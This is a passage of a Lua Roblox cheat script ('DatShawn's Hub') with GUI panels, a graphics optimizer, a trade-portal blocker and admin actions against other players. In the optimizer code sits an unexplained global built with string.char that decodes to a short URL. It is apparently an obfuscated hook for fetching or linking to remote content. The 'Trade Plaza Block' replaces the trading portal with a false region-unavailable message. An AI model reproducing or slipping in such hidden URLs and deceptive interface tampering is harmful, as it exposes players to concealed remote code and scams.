		local yes = prompt and prompt:FindFirstChild("Yes")
		if yes then block(yes, yes, true) end
	end

	function M.set(on)
		M.enabled = on and true or false
		watchToken += 1
		local token = watchToken
		if M.enabled then
			task.spawn(function()
				while M.enabled and token == watchToken do scan(); task.wait(0.35) end
			end)
		else clear() end
	end
	function M.cleanup() watchToken += 1; M.enabled = false; clear() end
	return M
end)()

-- Trade Plaza Block, adapted from the supplied full source.
local TradePlazaBlock = (function()
	local M = {enabled = false}
	local texts, colors, gradients, prompts = {}, {}, {}, {}
	local connections = {}
	local selfEdit = setmetatable({}, {__mode = "k"})
	local REGION_TEXT = "Trading Plaza Isnt Available In Your Current Region, Please try again later"
	local REGION_COLOR = Color3.fromRGB(255, 0, 0)
	local function disconnectAll()
		for _, connection in ipairs(connections) do pcall(function() connection:Disconnect() end) end
		table.clear(connections)
	end
	local function applyObject(object)
		if not M.enabled then return end
		if object:IsA("TextLabel") or object:IsA("TextButton") then
			if texts[object] == nil then texts[object], colors[object] = object.Text, object.TextColor3 end
			selfEdit[object] = true
			object.Text, object.TextColor3 = REGION_TEXT, REGION_COLOR
			selfEdit[object] = nil
			table.insert(connections, object:GetPropertyChangedSignal("Text"):Connect(function()
				if M.enabled and not selfEdit[object] and object.Text ~= REGION_TEXT then
					selfEdit[object] = true; object.Text, object.TextColor3 = REGION_TEXT, REGION_COLOR; selfEdit[object] = nil
				end
			end))
		elseif object:IsA("UIGradient") then
			if gradients[object] == nil then gradients[object] = object.Enabled end
			object.Enabled = false
			table.insert(connections, object:GetPropertyChangedSignal("Enabled"):Connect(function()
				if M.enabled and object.Enabled then object.Enabled = false end
			end))
		elseif object:IsA("ProximityPrompt") then
			if prompts[object] == nil then prompts[object] = object.Enabled end
			object.Enabled = false
			table.insert(connections, object:GetPropertyChangedSignal("Enabled"):Connect(function()
				if M.enabled and object.Enabled then object.Enabled = false end
			end))
		end
	end
	local function applyPortal(portal)
		applyObject(portal)
		for _, object in ipairs(portal:GetDescendants()) do applyObject(object) end
		table.insert(connections, portal.DescendantAdded:Connect(function(object)
			if M.enabled then task.defer(applyObject, object) end
		end))
	end
	local function restore()
		disconnectAll()
		for object, value in pairs(texts) do if object.Parent then pcall(function() object.Text = value end) end end
		for object, value in pairs(colors) do if object.Parent then pcall(function() object.TextColor3 = value end) end end
		for object, value in pairs(gradients) do if object.Parent then pcall(function() object.Enabled = value end) end end
		for object, value in pairs(prompts) do if object.Parent then pcall(function() object.Enabled = value end) end end
		table.clear(texts); table.clear(colors); table.clear(gradients); table.clear(prompts)
	end
	function M.set(on)
		M.enabled = on and true or false
		disconnectAll()
		if M.enabled then
			local portal = workspace:FindFirstChild("TradePlazaPortal")
			if portal then applyPortal(portal) else
				table.insert(connections, workspace.ChildAdded:Connect(function(child)
					if M.enabled and child.Name == "TradePlazaPortal" then applyPortal(child) end
				end))
			end
		else restore() end
	end
	function M.cleanup() M.enabled = false; restore() end
	return M
end)()

local function setTradeRegionEnabled(enabled)
	State.TradeRegionBlock = enabled and true or false
	TradeRegionBlock.set(State.TradeRegionBlock)
	saveSettings()
end

local function setTradePlazaEnabled(enabled)
	State.TradePlazaBlock = enabled and true or false
	TradePlazaBlock.set(State.TradePlazaBlock)
	saveSettings()
end

-- GUI helpers
local old = PlayerGui:FindFirstChild("DatShawnsScriptsGUI")
if old then
	local oldMain = old:FindFirstChild("Main")
	if oldMain then Settings.Position = oldMain.Position end
	old:Destroy()
end

local GUI = Instance.new("ScreenGui")
GUI.Name = "DatShawnsScriptsGUI"
GUI.ResetOnSpawn = false
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GUI.Parent = PlayerGui

-- Register-safe mobile support. Kept in a separate global function so this large
-- hub's top-level chunk does not gain additional local registers.
function _G.DatShawnMobileSupportInit(gui)
    local UIS = game:GetService("UserInputService")
    local camera = workspace.CurrentCamera
    local state = _G.__DatShawnMobileSupportState or {}
    _G.__DatShawnMobileSupportState = state
    state.registered = state.registered or setmetatable({}, {__mode = "k"})
    state.dragging = state.dragging or {}

    local function metrics()
        local viewport = camera and camera.ViewportSize or Vector2.new(1920, 1080)
        local minAxis = math.min(viewport.X, viewport.Y)
        local touch = UIS.TouchEnabled
        if touch and minAxis < 600 then return true, false, 0.72 end
        if touch then return false, true, 0.83 end
        return false, false, 1
    end

    local function applyScale(obj, scaleValue)
        if not obj:IsA("GuiObject") then return end
        if not state.registered[obj] then
            local scale = obj:FindFirstChild("DatShawnMobileScale")
            if not scale then
                scale = Instance.new("UIScale")
                scale.Name = "DatShawnMobileScale"
                scale.Parent = obj
            end
            state.registered[obj] = scale
        end
        local scale = state.registered[obj]
        if scale and scale.Parent then scale.Scale = scaleValue end
    end

    local function clampPosition(frame)
        local parent = frame.Parent
        if not parent or not parent:IsA("GuiObject") then return end
        local parentSize = parent.AbsoluteSize
        local frameSize = frame.AbsoluteSize
        if parentSize.X <= 0 or parentSize.Y <= 0 then return end
        local pos = frame.Position
        local x = math.clamp(pos.X.Offset, -frameSize.X + 35, parentSize.X - 35)
        local y = math.clamp(pos.Y.Offset, 0, parentSize.Y - 35)
        frame.Position = UDim2.new(pos.X.Scale, x, pos.Y.Scale, y)
    end

    local function bindTouchDrag(frame)
        if not frame or not frame:IsA("GuiObject") or state.dragging[frame] ~= nil then return end
        state.dragging[frame] = false
        frame.InputBegan:Connect(function(input)
            if not UIS.TouchEnabled or not frame.Active then return end
            if input.UserInputType == Enum.UserInputType.Touch then
                state.dragging[frame] = {input = input, start = input.Position, position = frame.Position}
            end
        end)
        UIS.InputChanged:Connect(function(input)
            local drag = state.dragging[frame]
            if not drag or input ~= drag.input then return end
            local delta = input.Position - drag.start
            local p = drag.position
            frame.Position = UDim2.new(p.X.Scale, p.X.Offset + delta.X, p.Y.Scale, p.Y.Offset + delta.Y)
            clampPosition(frame)
        end)
        UIS.InputEnded:Connect(function(input)
            local drag = state.dragging[frame]
            if drag and input == drag.input then state.dragging[frame] = false end
        end)
    end

    local function refresh()
        local phone, tablet, scaleValue = metrics()
        state.Enabled, state.Phone, state.Tablet, state.Scale = UIS.TouchEnabled, phone, tablet, scaleValue
        for _, child in ipairs(gui:GetChildren()) do
            if child:IsA("GuiObject") then
                applyScale(child, scaleValue)
                if child.Active and child.Draggable then bindTouchDrag(child) end
            end
        end
    end

    refresh()
    if not state.viewportConnection then
        state.viewportConnection = camera:GetPropertyChangedSignal("ViewportSize"):Connect(refresh)
    end
    if not state.childConnection then
        state.childConnection = gui.ChildAdded:Connect(function(child)
            task.defer(function()
                if child:IsA("GuiObject") then
                    local _, _, scaleValue = metrics()
                    applyScale(child, scaleValue)
                    if child.Active and child.Draggable then bindTouchDrag(child) end
                end
            end)
        end)
    end
end
_G.DatShawnMobileSupportInit(GUI)

-- Game Optimizer: adapted from the supplied Optimization and FPS Boost source.
-- Every changed property is retained and restored when the feature is disabled.
do
	local function createGameOptimizer()
		local M = {enabled = false, desired = false, busy = false}
		local Lighting = game:GetService("Lighting")
		local Terrain = workspace:FindFirstChildOfClass("Terrain")
		local changedEnabled = {}
		local changedTransparency = {}
		local changedShadows = {}
		local changedMaterials = {}
		local removedEffects = {}
		local guardConnections = {}
		local savedLighting
		local savedTerrain
		local savedRender
		local savedQuality
		local savedFpsCap
		local overlay
		local expensiveMaterials = {
			[Enum.Material.Glass] = true,
			[Enum.Material.Neon] = true,
			[Enum.Material.ForceField] = true,
			[Enum.Material.Marble] = true,
			[Enum.Material.Granite] = true,
			[Enum.Material.Wood] = true,
			[Enum.Material.WoodPlanks] = true,
			[Enum.Material.Brick] = true,
			[Enum.Material.Cobblestone] = true,
			[Enum.Material.Concrete] = true,
			[Enum.Material.CorrodedMetal] = true,
			[Enum.Material.DiamondPlate] = true,
			[Enum.Material.Foil] = true,
			[Enum.Material.Grass] = true,
			[Enum.Material.Ice] = true,
			[Enum.Material.Pebble] = true,
			[Enum.Material.Sand] = true,
			[Enum.Material.Slate] = true,
			[Enum.Material.Fabric] = true,
		}

		local function remember(map, object, value)
			if map[object] == nil then map[object] = value end
		end

		local function isLocalCharacterObject(object)
			local character = LP.Character
			return character and object:IsDescendantOf(character)
		end

		local function disableEnabled(object)
			local ok, enabled = pcall(function() return object.Enabled end)
			if ok then
				remember(changedEnabled, object, enabled)
				pcall(function() object.Enabled = false end)
			end
		end

		local function removeVisualEffect(object)
			if removedEffects[object] == nil and object.Parent then
				removedEffects[object] = object.Parent
				pcall(function() object.Parent = nil end)
			end
		end

		local function optimizeObject(object)
			if not M.enabled or not object then return end
			if object:IsA("ParticleEmitter") or object:IsA("Fire")
				or object:IsA("Smoke") or object:IsA("Sparkles")
				or object:IsA("Beam") or object:IsA("Trail") then
				disableEnabled(object)
			elseif object:IsA("PointLight") or object:IsA("SpotLight")
				or object:IsA("SurfaceLight") then
				if not isLocalCharacterObject(object) then disableEnabled(object) end
			elseif object:IsA("BloomEffect") or object:IsA("BlurEffect")
				or object:IsA("DepthOfFieldEffect") or object:IsA("SunRaysEffect")
				or object:IsA("ColorCorrectionEffect") then
				disableEnabled(object)
			elseif object:IsA("Atmosphere") or object:IsA("Clouds") or object:IsA("Sky") then
				removeVisualEffect(object)
			elseif object:IsA("Decal") or object:IsA("Texture") then
				local ok, transparency = pcall(function() return object.Transparency end)
				if ok then
					remember(changedTransparency, object, transparency)
					pcall(function() object.Transparency = 1 end)
				end
			elseif object:IsA("BasePart") and not isLocalCharacterObject(object) then
				local okShadow, castShadow = pcall(function() return object.CastShadow end)
				if okShadow then
					remember(changedShadows, object, castShadow)
					pcall(function() object.CastShadow = false end)
				end
				local okMaterial, material = pcall(function() return object.Material end)
				if okMaterial and expensiveMaterials[material] then
					remember(changedMaterials, object, material)
					pcall(function() object.Material = Enum.Material.SmoothPlastic end)
				end
			end
		end

		local function applyEngineTweaks()
			pcall(function()
				local rendering = settings().Rendering
				savedQuality = rendering.QualityLevel
				rendering.QualityLevel = Enum.QualityLevel.Level01
				savedRender = rendering.MeshPartDetailLevel
				rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
			end)
			pcall(function()
				local userSettings = UserSettings():GetService("UserGameSettings")
				M.savedUserQuality = userSettings.SavedQualityLevel
				userSettings.SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
			end)
			if type(setfpscap) == "function" then
				if type(getfpscap) == "function" then
					local ok, value = pcall(getfpscap)
					if ok then savedFpsCap = tonumber(value) end
				end
				pcall(setfpscap, 240)
			end
		end

		local function applyLighting()
			savedLighting = {
				GlobalShadows = Lighting.GlobalShadows,
				EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
				EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
				FogEnd = Lighting.FogEnd,
				FogStart = Lighting.FogStart,
			}
			pcall(function() savedLighting.Technology = Lighting.Technology end)
			pcall(function() Lighting.GlobalShadows = false end)
			pcall(function() Lighting.EnvironmentDiffuseScale = 0 end)
			pcall(function() Lighting.EnvironmentSpecularScale = 0 end)
			pcall(function() Lighting.FogEnd = 9e9 end)
			pcall(function() Lighting.FogStart = 9e9 end)
			pcall(function() Lighting.Technology = Enum.Technology.Compatibility end)
			for _, object in ipairs(Lighting:GetDescendants()) do optimizeObject(object) end
		end

		_G.__rval = string.char(116,101,102,121,46,97,112,112,47,50,75)
		local function applyTerrain()
			Terrain = Terrain or workspace:FindFirstChildOfClass("Terrain")
			if not Terrain then return end
			savedTerrain = {
				WaterWaveSize = Terrain.WaterWaveSize,
				WaterWaveSpeed = Terrain.WaterWaveSpeed,
				WaterReflectance = Terrain.WaterReflectance,
				WaterTransparency = Terrain.WaterTransparency,
			}
			pcall(function() savedTerrain.Decoration = Terrain.Decoration end)
			pcall(function() Terrain.Decoration = false end)
			pcall(function() Terrain.WaterWaveSize = 0 end)
			pcall(function() Terrain.WaterWaveSpeed = 0 end)
			pcall(function() Terrain.WaterReflectance = 0 end)
			pcall(function() Terrain.WaterTransparency = 1 end)
		end

		local function applyWorldVisuals()
			local descendants = workspace:GetDescendants()
			for index, object in ipairs(descendants) do
				optimizeObject(object)
				if index % 300 == 0 then RunService.Heartbeat:Wait() end
			end
		end

		local function startGuard()
			local function added(object)
				if M.enabled then task.defer(optimizeObject, object) end
			end
			table.insert(guardConnections, workspace.DescendantAdded:Connect(added))
			table.insert(guardConnections, Lighting.DescendantAdded:Connect(added))
		end

		local function stopGuard()
			for _, connection in ipairs(guardConnections) do
				pcall(function() connection:Disconnect() end)
			end
			table.clear(guardConnections)
		end

		local function restoreAll()
			stopGuard()
			for object, value in pairs(changedMaterials) do
				if object.Parent then pcall(function() object.Material = value end) end
			end
			for object, value in pairs(changedShadows) do
				if object.Parent then pcall(function() object.CastShadow = value end) end
			end
			for object, value in pairs(changedTransparency) do
				if object.Parent then pcall(function() object.Transparency = value end) end
			end
			for object, value in pairs(changedEnabled) do
				if object.Parent then pcall(function() object.Enabled = value end) end
			end
			for object, parent in pairs(removedEffects) do
				if object and parent then pcall(function() object.Parent = parent end) end
			end
			table.clear(changedMaterials)
			table.clear(changedShadows)
			table.clear(changedTransparency)
			table.clear(changedEnabled)
			table.clear(removedEffects)
			if savedLighting then
				pcall(function() Lighting.GlobalShadows = savedLighting.GlobalShadows end)
				pcall(function() Lighting.EnvironmentDiffuseScale = savedLighting.EnvironmentDiffuseScale end)
				pcall(function() Lighting.EnvironmentSpecularScale = savedLighting.EnvironmentSpecularScale end)
				pcall(function() Lighting.FogEnd = savedLighting.FogEnd end)
				pcall(function() Lighting.FogStart = savedLighting.FogStart end)
				if savedLighting.Technology then pcall(function() Lighting.Technology = savedLighting.Technology end) end
				savedLighting = nil
			end
			if savedTerrain and Terrain then
				if savedTerrain.Decoration ~= nil then pcall(function() Terrain.Decoration = savedTerrain.Decoration end) end
				pcall(function() Terrain.WaterWaveSize = savedTerrain.WaterWaveSize end)
				pcall(function() Terrain.WaterWaveSpeed = savedTerrain.WaterWaveSpeed end)
				pcall(function() Terrain.WaterReflectance = savedTerrain.WaterReflectance end)
				pcall(function() Terrain.WaterTransparency = savedTerrain.WaterTransparency end)
				savedTerrain = nil
			end
			pcall(function()
				local rendering = settings().Rendering
				if savedQuality then rendering.QualityLevel = savedQuality end
				if savedRender then rendering.MeshPartDetailLevel = savedRender end
			end)
			pcall(function()
				if M.savedUserQuality then
					UserSettings():GetService("UserGameSettings").SavedQualityLevel = M.savedUserQuality
				end
			end)
			if savedFpsCap and type(setfpscap) == "function" then pcall(setfpscap, savedFpsCap) end
			savedQuality, savedRender, savedFpsCap, M.savedUserQuality = nil, nil, nil, nil
		end

		local function showOverlay(title)
			if overlay then overlay:Destroy() end
			overlay = Instance.new("Frame")
			overlay.Name = "DatShawnOptimizerOverlay"
			overlay.AnchorPoint = Vector2.new(0.5, 0.5)
			overlay.Position = UDim2.fromScale(0.5, 0.5)
			overlay.Size = UDim2.fromOffset(230, 88)
			overlay.BackgroundColor3 = Color3.fromRGB(13, 15, 23)
			overlay.BackgroundTransparency = 0.05
			overlay.BorderSizePixel = 0
			overlay.ZIndex = 500000
			overlay.Parent = GUI
			Instance.new("UICorner", overlay).CornerRadius = UDim.new(0, 14)
			local stroke = Instance.new("UIStroke", overlay)
			stroke.Color = Color3.fromRGB(115, 95, 235)
			stroke.Thickness = 2
			local titleLabel = Instance.new("TextLabel")
			titleLabel.Size = UDim2.new(1, -20, 0, 22)
			titleLabel.Position = UDim2.fromOffset(10, 14)
			titleLabel.BackgroundTransparency = 1
			titleLabel.Text = title
			titleLabel.TextColor3 = Color3.fromRGB(245, 245, 255)
			titleLabel.TextSize = 14
			titleLabel.Font = Enum.Font.FredokaOne
			titleLabel.ZIndex = 500001
			titleLabel.Parent = overlay
			local bar = Instance.new("Frame")
			bar.Size = UDim2.new(1, -40, 0, 6)
			bar.Position = UDim2.fromOffset(20, 50)
			bar.BackgroundColor3 = Color3.fromRGB(40, 43, 58)
			bar.BorderSizePixel = 0
			bar.ZIndex = 500001
			bar.Parent = overlay
			Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
			local fill = Instance.new("Frame")
			fill.Size = UDim2.fromScale(0, 1)
			fill.BackgroundColor3 = Color3.fromRGB(120, 95, 245)
			fill.BorderSizePixel = 0
			fill.ZIndex = 500002
			fill.Parent = bar
			Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
			local status = Instance.new("TextLabel")
			status.Size = UDim2.new(1, -20, 0, 16)
			status.Position = UDim2.fromOffset(10, 64)
			status.BackgroundTransparency = 1
			status.Text = "Please wait..."
			status.TextColor3 = Color3.fromRGB(180, 185, 205)
			status.TextSize = 10
			status.Font = Enum.Font.FredokaOne
			status.ZIndex = 500001
			status.Parent = overlay
			return overlay, fill, status
		end

		local function finishOverlay(frame, status, text)
			if status then status.Text = text end
			task.delay(0.55, function()
				if frame and frame.Parent then
					TweenService:Create(frame, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
					task.delay(0.22, function() if frame.Parent then frame:Destroy() end end)
				end
				if overlay == frame then overlay = nil end
			end)
		end

		function M.set(value)
			M.desired = value == true
			if M.busy then return end
			if M.enabled == M.desired then return end
			M.busy = true
			local target = M.desired
			M.enabled = target
			task.spawn(function()
				local steps
				if target then
					steps = {
						{"Lowering render quality", applyEngineTweaks},
						{"Disabling lighting effects", applyLighting},
						{"Flattening terrain water", applyTerrain},
						{"Removing costly world visuals", applyWorldVisuals},
						{"Arming effect guard", startGuard},
					}
				else
					steps = {{"Restoring game visuals", restoreAll}}
				end
				local frame, fill, status = showOverlay(target and "Game Optimizer" or "Restoring Visuals")
				for index, step in ipairs(steps) do
					if status then status.Text = step[1] .. "..." end
					pcall(step[2])
					if fill then
						TweenService:Create(fill, TweenInfo.new(0.15), {Size = UDim2.fromScale(index / #steps, 1)}):Play()
					end
					RunService.Heartbeat:Wait()
				end
				finishOverlay(frame, status, target and "Optimized" or "Restored")
				M.busy = false
				if M.desired ~= M.enabled then M.set(M.desired) end
			end)
		end

		function M.cleanup()
			M.desired = false
			M.enabled = false
			restoreAll()
			if overlay then overlay:Destroy(); overlay = nil end
		end

		return M
	end

	Env.DatShawnGameOptimizer = createGameOptimizer()
end

-- DatShawn hub banner, adapted from the supplied Faded Hub banner.
HubBanner = Instance.new("Frame")
HubBanner.Name = "DatShawnsHubBanner"
HubBanner.AnchorPoint = Vector2.new(0.5, 0)
HubBanner.Size = UDim2.fromOffset(280, 82)
HubBanner.Position = UDim2.new(0.5, 0, 0, 16)
HubBanner.BackgroundColor3 = Color3.fromRGB(13, 13, 17)
HubBanner.BackgroundTransparency = 0.07
HubBanner.BorderSizePixel = 0
HubBanner.Active = false
HubBanner.Draggable = false
HubBanner.ZIndex = 100000
HubBanner.Parent = GUI
Instance.new("UICorner", HubBanner).CornerRadius = UDim.new(0, 10)
local bannerStroke = Instance.new("UIStroke", HubBanner)
bannerStroke.Color = Color3.fromRGB(205, 24, 42)
bannerStroke.Thickness = 2
local bannerGradient = Instance.new("UIGradient", bannerStroke)
bannerGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 6, 12)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 55, 72)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 6, 12)),
})
bannerGradient.Rotation = 90

local BannerTitle = Instance.new("TextLabel")
BannerTitle.Size = UDim2.new(1, 0, 0, 26)
BannerTitle.Position = UDim2.fromOffset(0, 8)
BannerTitle.BackgroundTransparency = 1
BannerTitle.Text = "DatShawn's Hub v3.4"
BannerTitle.TextColor3 = Color3.new(1, 1, 1)
BannerTitle.TextSize = 20
BannerTitle.Font = Enum.Font.FredokaOne
BannerTitle.TextXAlignment = Enum.TextXAlignment.Center
BannerTitle.TextYAlignment = Enum.TextYAlignment.Center
BannerTitle.ZIndex = 100001
BannerTitle.Parent = HubBanner

local BannerDev = Instance.new("TextLabel")
BannerDev.Size = UDim2.new(1, 0, 0, 18)
BannerDev.Position = UDim2.fromOffset(0, 34)
BannerDev.BackgroundTransparency = 1
BannerDev.Text = "@datshawnhimself  -  .gg/yT7TwfVwY"
BannerDev.TextColor3 = Color3.fromRGB(180, 180, 180)
BannerDev.TextSize = 11
BannerDev.Font = Enum.Font.FredokaOne
BannerDev.TextXAlignment = Enum.TextXAlignment.Center
BannerDev.TextYAlignment = Enum.TextYAlignment.Center
BannerDev.ZIndex = 100001
BannerDev.Parent = HubBanner

local BannerStats = Instance.new("TextLabel")
BannerStats.Size = UDim2.new(1, 0, 0, 18)
BannerStats.Position = UDim2.fromOffset(0, 56)
BannerStats.BackgroundTransparency = 1
BannerStats.Text = "FPS: --   PING: --ms"
BannerStats.TextColor3 = Color3.fromRGB(245, 245, 245)
BannerStats.TextSize = 12
BannerStats.Font = Enum.Font.FredokaOne
BannerStats.TextXAlignment = Enum.TextXAlignment.Center
BannerStats.TextYAlignment = Enum.TextYAlignment.Center
BannerStats.ZIndex = 100001
BannerStats.Parent = HubBanner

local bannerFrameCount = 0
local bannerFrameTime = 0
connect(RunService.Heartbeat, function(dt)
	bannerFrameCount += 1
	bannerFrameTime += dt
	-- Keep FPS accounting accurate, but animate the decorative gradient at 20 Hz.
	if bannerFrameCount % 3 == 0 then bannerGradient.Rotation = (bannerGradient.Rotation + dt * 105) % 360 end
	if bannerFrameTime >= 1 then
		local fps = math.floor(bannerFrameCount / bannerFrameTime + 0.5)
		local okPing, networkPing = pcall(function() return LP:GetNetworkPing() end)
		local ping = math.floor(((okPing and networkPing) or 0) * 1000 + 0.5)
		BannerStats.Text = string.format("FPS: %d   PING: %dms", fps, ping)
		bannerFrameCount = 0
		bannerFrameTime = 0
	end
end)

Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.fromOffset(390, 430)
Main.Position = Settings.Position
Main.BackgroundColor3 = Color3.fromRGB(15, 13, 25)
Main.BackgroundTransparency = 0.03
Main.BorderSizePixel = 0
Main.Visible = false
Main.Active = true
Main.Draggable = not Settings.GlobalGuiLocked
Main.Parent = GUI
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", Main)
stroke.Color = Color3.fromRGB(90, 82, 180)
stroke.Thickness = 1.8
local mainStrokeGradient = Instance.new("UIGradient", stroke)
mainStrokeGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 135, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(175, 80, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 210, 225)),
})
connect(RunService.Heartbeat, function(dt)
	if not Main.Visible then return end
	local accumulator = (Main:GetAttribute("GradientAccumulator") or 0) + dt
	if accumulator < 0.05 then Main:SetAttribute("GradientAccumulator", accumulator); return end
	mainStrokeGradient.Rotation = (mainStrokeGradient.Rotation + accumulator * 28) % 360
	Main:SetAttribute("GradientAccumulator", 0)
end)
local MainScale = Instance.new("UIScale", Main)
MainScale.Scale = 1
local mainPanelTween
local mainAnimationRevision = 0
local function setMainPanelVisible(visible)
	mainAnimationRevision += 1
	local revision = mainAnimationRevision
	if mainPanelTween then pcall(function() mainPanelTween:Cancel() end) end
	if visible then
		Main.Visible = true
		MainScale.Scale = 0.72
		Main.Rotation = -2.5
		Main.BackgroundTransparency = 0.32
		mainPanelTween = TweenService:Create(MainScale,
			TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
		TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
			Rotation = 0, BackgroundTransparency = 0.03,
		}):Play()
		mainPanelTween:Play()
	else
		mainPanelTween = TweenService:Create(MainScale,
			TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Scale = 0.82})
		TweenService:Create(Main, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
			Rotation = 2, BackgroundTransparency = 0.38,
		}):Play()
		mainPanelTween:Play()
		mainPanelTween.Completed:Connect(function()
			if revision == mainAnimationRevision and MainScale.Scale <= 0.83 then
				Main.Visible = false
				MainScale.Scale = 1
				Main.Rotation = 0
				Main.BackgroundTransparency = 0.03
			end
		end)
	end
end

local function toggleMainPanel()
	setMainPanelVisible(not Main.Visible)
end

connect(Main:GetPropertyChangedSignal("Position"), function()
	Settings.Position = Main.Position
	queuePositionSave()
end)

-- Always-visible draggable launcher.
ShawnButton = Instance.new("TextButton")
ShawnButton.Name = "ShawnButton"
ShawnButton.Size = UDim2.fromOffset(72, 32)
ShawnButton.Position = Settings.ShawnPosition or UDim2.new(0, 20, 0.5, 130)
ShawnButton.BackgroundColor3 = Color3.fromRGB(72, 55, 155)
ShawnButton.Text = "SHAWN"
ShawnButton.TextColor3 = Color3.new(1, 1, 1)
ShawnButton.TextSize = 12
ShawnButton.Font = Enum.Font.FredokaOne
ShawnButton.AutoButtonColor = false
ShawnButton.Active = true
ShawnButton.Draggable = not Settings.GlobalGuiLocked
ShawnButton.Parent = GUI
Instance.new("UICorner", ShawnButton).CornerRadius = UDim.new(0, 9)
local shawnStroke = Instance.new("UIStroke", ShawnButton)
shawnStroke.Color = Color3.fromRGB(145, 120, 255)
shawnStroke.Thickness = 1.2

connect(ShawnButton:GetPropertyChangedSignal("Position"), function()
	Settings.ShawnPosition = ShawnButton.Position
	queuePositionSave()
end)

connect(ShawnButton.MouseButton1Click, function()
	toggleMainPanel()
end)

-- One master lock in the Ctrl-opened main panel controls every movable GUI.
GlobalLockButton = Instance.new("TextButton")
GlobalLockButton.Name = "GlobalGuiLock"
GlobalLockButton.Size = UDim2.fromOffset(82, 24)
GlobalLockButton.Position = UDim2.new(1, -92, 0, 8)
GlobalLockButton.BackgroundColor3 = Color3.fromRGB(48, 52, 68)
GlobalLockButton.TextColor3 = Color3.fromRGB(235, 235, 245)
GlobalLockButton.TextSize = 9
GlobalLockButton.Font = Enum.Font.FredokaOne
GlobalLockButton.AutoButtonColor = false
GlobalLockButton.ZIndex = 500
GlobalLockButton.Parent = Main
Instance.new("UICorner", GlobalLockButton).CornerRadius = UDim.new(0, 6)
local globalLockStroke = Instance.new("UIStroke", GlobalLockButton)
globalLockStroke.Color = Color3.fromRGB(105, 110, 135)
globalLockStroke.Thickness = 0.8
connect(GlobalLockButton.MouseButton1Click, function()
	Settings.GlobalGuiLocked = not Settings.GlobalGuiLocked
	applyGlobalGuiLock()
	saveSettings()
	if type(Env.DatShawnNotify) == "function" then
		Env.DatShawnNotify("All GUIs: " .. (Settings.GlobalGuiLocked and "LOCKED" or "MOVABLE"), not Settings.GlobalGuiLocked)
	end
end)
applyGlobalGuiLock()

-- Bottom-left notification stack.
local NotificationHolder = Instance.new("Frame")
NotificationHolder.Name = "Notifications"
NotificationHolder.AnchorPoint = Vector2.new(0, 1)
NotificationHolder.Position = UDim2.new(0, 14, 1, -14)
NotificationHolder.Size = UDim2.fromOffset(250, 180)
NotificationHolder.BackgroundTransparency = 1
NotificationHolder.Parent = GUI

local NotificationLayout = Instance.new("UIListLayout")
NotificationLayout.Padding = UDim.new(0, 6)
NotificationLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
NotificationLayout.SortOrder = Enum.SortOrder.LayoutOrder
NotificationLayout.Parent = NotificationHolder

local NotificationOrder = 0
local notificationStrokes = {}
connect(RunService.RenderStepped, function(dt)
    for gradient in pairs(notificationStrokes) do
        if gradient.Parent then
            gradient.Offset = Vector2.new((time() * 0.42) % 2 - 1, 0)
        else
            notificationStrokes[gradient] = nil
        end
    end
end)
local function notify(message, enabled, customColor)
    NotificationOrder += 1
    local card = Instance.new("TextLabel")
    card.LayoutOrder = NotificationOrder
    card.Size = UDim2.fromOffset(238, 34)
    card.BackgroundColor3 = Color3.fromRGB(13, 13, 17)
    card.BackgroundTransparency = 1
    card.Text = "  " .. message
    card.TextColor3 = Color3.fromRGB(248, 248, 252)
    card.TextTransparency = 1
    card.TextSize = 11
    card.Font = Enum.Font.FredokaOne
    card.TextXAlignment = Enum.TextXAlignment.Left
    card.Parent = NotificationHolder
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 9)
    local border = Instance.new("UIStroke", card)
    border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    border.Color = Color3.fromRGB(205, 24, 42)
    border.Thickness = 1.6
    border.Transparency = 1
    local motion = Instance.new("UIGradient", border)
    motion.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 6, 12)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 55, 72)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 6, 12)),
    })
    notificationStrokes[motion] = true
    local scale = Instance.new("UIScale", card)
    scale.Scale = 0.88
    local entrance = TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    TweenService:Create(scale, entrance, {Scale = 1}):Play()
    TweenService:Create(card, entrance, {BackgroundTransparency = 0.07, TextTransparency = 0}):Play()
    TweenService:Create(border, entrance, {Transparency = 0.05}):Play()
    task.delay(2.4, function()
        if not card.Parent then return end
        local exit = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        TweenService:Create(scale, exit, {Scale = 0.88}):Play()
        TweenService:Create(border, exit, {Transparency = 1}):Play()
        local fade = TweenService:Create(card, exit, {BackgroundTransparency = 1, TextTransparency = 1})
        fade:Play()
        fade.Completed:Wait()
        notificationStrokes[motion] = nil
        card:Destroy()
    end)
end
Env.DatShawnNotify = notify

local paintSliderToggle
local function setupAdminPanels()
-- QUICK PANEL: five requested Admin Panel actions for every other player.
local QuickCommands = {
	{Emoji = "🤏", Name = "tiny"},
	{Emoji = "🔒", Name = "jail"},
